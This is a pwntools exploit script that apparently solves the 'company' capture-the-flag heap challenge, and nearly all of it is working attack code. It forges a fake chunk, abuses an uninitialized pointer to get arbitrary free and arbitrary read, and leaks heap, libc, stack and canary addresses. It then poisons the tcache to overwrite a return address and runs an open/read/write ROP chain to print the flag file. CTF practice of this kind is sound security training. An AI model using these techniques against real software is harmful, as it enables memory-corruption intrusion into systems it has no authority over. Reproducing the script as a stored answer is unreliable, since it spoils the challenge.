#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./company"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("company.chal.crewc.tf", 17001)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        # view
		#b *0x40186d
        #b *0x40150f
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


def register_emp(index: int, name, position, salary: int):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b':', str(index))
    p.sendafter(b':', name)
    p.sendafter(b':', position)
    p.sendlineafter(b':', str(salary))

def fire_emp(index: int):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b':', str(index))

def feedback_emp(index_from: int, index_to: int, feedback):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'?', str(index_from))
    p.sendlineafter(b'?', str(index_to))
    p.sendafter(b':', feedback)

def view_feedback(index: int):
    p.sendlineafter(b'>', b'4')
    p.sendlineafter(b'?', str(index))
    p.recvuntil(b"Feedback: ")
    return p.recvline().rstrip()

def AAR(addr: int):
    register_emp(1, b"0w0", b"HR\0", 0x1234)
    feedback_emp(1, 1, b'X'*0x40 + p64(addr))
    fire_emp(1)
    register_emp(1, b"UwU", b"HR\0", 0)
    leak = u64(view_feedback(1).ljust(8, b'\x00'))
    feedback_emp(1, 1, b"E"*0x40 + p64(0))
    fire_emp(1)
    return leak

"""
struct enmployee {
    char name[0x20],
    char position[0x20],
    char* feedback,
    unsigned int salary,
};
size: 0x50
"""

# register name (fake chunk header)
name = p64(0) + p64(0x61) + p64(0)
p.sendlineafter('?', name)

# overwrite my position (Staff -> HR)
my_position_addr = 0x404080
log.info("position@bss: " + hex(my_position_addr))
register_emp(0, b'A' * 0x8, b"HR", 0x1234)
## feedback will be B.feedback
feedback_emp(0, 0, b'A' * 0x40 + p64(my_position_addr - 0x10))
## enmployee A.feedback is not initialized
fire_emp(0)
## enmployee A.feedback -> B
register_emp(1, b'B' * 0x8, b"HR", 0x1234)
## call free(my_position_addr - 0x10)
fire_emp(1)
## allocate my_position_addr@bss
register_emp(0, b'C' * 0x10 + b"HR\0", b"HR", 0)

# leak addresses
emp_chunk_list_addr = 0x4040a0
## leak emp_chunk_list[1]
heap_leak = AAR(emp_chunk_list_addr + 0x8)
log.info("emp_chunk[1]@heap: " + hex(heap_leak))
## leak libc address
leak = AAR(elf.got["puts"])
libc_base = leak - libc.symbols["puts"]
libc.address = libc_base
rop = ROP(libc)
log.info("libc base: " + hex(libc_base))
## leak stack addresses
leak = AAR(libc.symbols["environ"])
log.info("env_vals@stack: " + hex(leak))
ret_ptr = leak - 0x160
log.info("ret_addr_ptr: " + hex(ret_ptr))
## leak canary
canary = ((AAR(ret_ptr + 0x30 + 1) << 0x8) & 0xffffffffffffffff)
log.info("canary: " + hex(canary))

# get RIP control
path = b"./" + b'\x00'

register_emp(3, b"A"*0x18, b"A"*0x18, 0x41)
register_emp(4, b"B"*0x18, b"B", 0x61)
register_emp(5, b"C"*0x18, b"C"*0x18, 0x43)
register_emp(6, b"D"*0x18, b"D"*0x18, 0x43)
register_emp(7, path + (b"E"*(0x18-len(path))), b"E"*0x18, 0x43)

fire_emp(3)
fire_emp(6)

fake_ptr = heap_leak + 0x60 - 0x10
## force free
register_emp(2, b"Z", b"HR\x00", 0x1234)
feedback_emp(2, 2, b"Z" * 0x40 + p64(fake_ptr))
fire_emp(2)
register_emp(2, b"Z", b"HR\x00", 0x1234)
fire_emp(2)
log.info("fake_ptr@heap: " + hex(fake_ptr))
## tcache poisoning
target = ret_ptr-0x8
register_emp(8, p64(0)+p64(0x60)+p64(target ^ (fake_ptr >> 12)) + b"A" * 8, b"F" * 0x18, 0x1337133713371337)
## overwrite return address
register_emp(3, b"A"*0x18, b"A"*0x18, 0x41)
register_emp(6, b"/flag\x00\x00\x00" + p64(rop.rdi[0])+p64(ret_ptr)+p64(libc.symbols['gets']), p64(rop.rdi[0])+p64(ret_ptr)+p64(libc.symbols['gets']), 0x41)

# get flag
flag_str = heap_leak + 0x180
syscall = rop.find_gadget(['syscall', 'ret'])[0]
## flag file path will written
rop.read(0, libc.bss(0x100), 0x30)

payload = b'A'*0x30
payload += b''.join([
    rop.chain(),
    # open(flag_path, O_RDONLY)
    p64(rop.rdi[0]),
    p64(libc.bss(0x100)),
    p64(rop.rsi[0]),
    p64(int(constants.O_RDONLY)),
    p64(rop.rdx[0]),
    p64(0),
    p64(rop.rax[0]),
    p64(2),
    p64(syscall),
    # read(flag_fd, libc_bss_0x500, 0x500)
    p64(rop.rdi[0]),
    p64(3),
    p64(rop.rsi[0]),
    p64(libc.bss(0x500)),
    p64(rop.rdx[0]),
    p64(0x500),
    p64(rop.rax[0]),
    p64(0),
    p64(syscall),
    # write(stdout, _libc_bss_0x500, 0x100)
    p64(rop.rdi[0]),
    p64(1),
    p64(rop.rsi[0]),
    p64(libc.bss(0x500)),
    p64(rop.rdx[0]),
    p64(0x100),
    p64(rop.rax[0]),
    p64(1),
    p64(syscall),
])

p.sendline(payload)
p.sendline(b"./flag_you_found_this_my_treasure_leaked.txt\x00")


p.interactive()
